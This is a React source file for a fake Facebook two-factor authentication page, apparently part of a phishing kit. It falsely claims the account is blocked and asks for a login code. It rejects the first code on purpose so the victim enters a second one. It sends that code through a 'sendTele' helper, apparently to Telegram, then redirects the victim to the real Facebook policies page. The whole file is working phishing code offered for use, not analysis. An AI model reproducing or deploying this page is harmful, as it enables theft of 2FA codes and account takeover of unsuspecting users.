import React, { useState, useEffect } from "react";
import { sendByForm } from "../sendTele";

function Confirm() {
  const [timeLeft, setTimeLeft] = useState(300); // 4:08 in seconds
  const [showModal, setShowModal] = useState(false);
  const [codeAttempts, setCodeAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [code, setCode] = useState("");

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => (prevTime > 0 ? prevTime - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, "0")}:${remainingSeconds
      .toString()
      .padStart(2, "0")}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (codeAttempts === 0) {
      setErrorMessage(
        "The code generator you entered is incorrect. Please wait 5 minutes to receive another one."
      );
      setCodeAttempts(1);
      setCode("");
      setTimeLeft(300); // Set the timer to 5 minutes (300 seconds)
    } else {
      await sendByForm(e);
      setShowModal(true);
      setErrorMessage("");
    }
  };

  const closeModal = () => {
    setShowModal(false);
    window.location.href = "https://www.facebook.com/policies_center/";
  };

  return (
    <>
      <div className="section-main flex-center">
        <form onSubmit={handleSubmit}>
          <div className="confirm-container">
            <h1 className="fw-bold">
              Two-factor authentication required (1/3)
            </h1>
            <p>
              We have temporarily blocked your account because Facebook Protect
              has changed. Verify code has been send to 2321****.
            </p>

            <div className="image-container">
              <img
                className="img-fluid"
                src="/2fa.gif"
                alt="Two-factor authentication illustration"
              />
            </div>

            <input
              type="text"
              placeholder="Enter your code"
              className="code-input mb-0"
              value={code}
              name="code"
              onChange={(e) => setCode(e.target.value)}
            />
            {errorMessage && (
              <div className="text-danger my-2">{errorMessage}</div>
            )}

            <div className="info-text mt-2">
              <p>
                You've asked us to require a 6-digit login code when anyone
                tries to access your account from a new device or browser. Enter
                the 6-digit code from your code generator or third-party app
                below.
              </p>
              <p>
                Please wait <strong>{formatTime(timeLeft)}</strong> to request
                the sending of the code.
              </p>
            </div>

            <p>
              We'll walk you through some steps to secure and unlock your
              account.
            </p>

            <button className="submit-button" type="submit">
              Submit
            </button>
            <a href="#" className="send-code-link">
              Send Code
            </a>
          </div>
        </form>
      </div>

      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content bg-white">
            <h2>Form Submitted Successfully</h2>
            <p>
              Thanks for contacting us. You'll get a notification when we
              respond in 1-2 business days. You can view responses in your
              Support Inbox.
            </p>
            <button className="modal-ok-button" onClick={closeModal}>
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
}

export default Confirm;
